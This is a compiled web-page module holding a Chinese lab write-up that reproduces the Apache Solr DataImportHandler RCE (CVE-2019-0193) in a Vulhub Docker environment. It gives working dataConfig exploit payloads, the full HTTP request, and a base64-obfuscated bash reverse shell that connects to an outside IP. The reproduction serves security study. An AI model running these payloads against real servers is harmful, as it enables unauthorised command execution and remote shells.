import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o,c as l,a as e,b as t,d as a,e as r}from"./app-58e4a7d6.js";const c={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),u=e("p",null,"漏洞原理与分析可以参考：",-1),p={href:"https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA",target:"_blank",rel:"noopener noreferrer"},m={href:"https://paper.seebug.org/1009/",target:"_blank",rel:"noopener noreferrer"},v=r(`<p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</p><p>本环境测试RCE漏洞。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Solr &lt; 8.2.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub运行漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>命令执行成功后，需要等待一会，之后访问<code>http://your-ip:8983/</code>即可查看到Apache solr的管理页面，无需登录。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011127866.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>如上图所示，首先打开刚刚创建好的<code>test</code>核心，选择Dataimport功能并选择debug模式，填入以下POC：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;dataConfig&gt;
  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;
  &lt;script&gt;&lt;![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;);
          }
  ]]&gt;&lt;/script&gt;
  &lt;document&gt;
    &lt;entity name=&quot;stackoverflow&quot;
            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;
            processor=&quot;XPathEntityProcessor&quot;
            forEach=&quot;/feed&quot;
            transformer=&quot;script:poc&quot; /&gt;
  &lt;/document&gt;
&lt;/dataConfig&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>点击<code>Execute with this Confuguration</code>会发送以下请求包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /solr/test/dataimport?_=1565835261600&amp;indent=on&amp;wt=json HTTP/1.1
Host: localhost:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 679
Connection: close
Referer: http://localhost:8983/solr/
Cookie: csrftoken=gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid=snzojzqa5zn187oghf06z6xodulpohpr

command=full-import&amp;verbose=false&amp;clean=false&amp;commit=true&amp;debug=true&amp;core=test&amp;dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&amp;name=dataimport
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011128146.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行<code>docker-compose exec solr ls /tmp</code>，可见<code>/tmp/success</code>已成功创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011128257.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>同样，构造反弹shell的POC：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;dataConfig&gt;
  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;
  &lt;script&gt;&lt;![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=}|{base64,-d}|{bash,-i}&quot;);
          }
  ]]&gt;&lt;/script&gt;
  &lt;document&gt;
    &lt;entity name=&quot;stackoverflow&quot;
            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;
            processor=&quot;XPathEntityProcessor&quot;
            forEach=&quot;/feed&quot;
            transformer=&quot;script:poc&quot; /&gt;
  &lt;/document&gt;
&lt;/dataConfig&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011135782.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011136596.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,22);function g(b,h){const n=s("ExternalLinkIcon");return o(),l("div",null,[d,u,e("ul",null,[e("li",null,[e("a",p,[t("https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA"),a(n)])]),e("li",null,[e("a",m,[t("https://paper.seebug.org/1009/"),a(n)])])]),v])}const _=i(c,[["render",g],["__file","Apache Solr 远程命令执行漏洞 CVE-2019-0193.html.vue"]]);export{_ as default};
